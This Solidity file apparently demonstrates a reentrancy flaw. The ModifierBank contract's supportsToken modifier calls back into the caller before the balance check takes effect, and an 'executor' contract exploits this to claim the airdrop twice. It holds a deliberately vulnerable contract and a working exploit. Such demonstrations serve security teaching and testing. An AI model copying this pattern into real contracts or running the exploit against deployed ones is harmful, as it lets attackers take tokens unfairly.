pragma solidity ^0.4.24;

contract ModifierBank {
    constructor() {
        owner = msg.sender;
    }

    address public owner;

  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";


  function airDrop() hasNoBalance supportsToken  public{
    tokenBalance[msg.sender] += 20;
  }


  modifier supportsToken() {
    require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken());
    _;
  }

  modifier hasNoBalance {
      require(tokenBalance[msg.sender] == 0);
      _;
  }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
}

contract Bank{
    function supportsToken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract executor {
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierBank(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function call(address token) public{
        ModifierBank(token).airDrop();
    }
}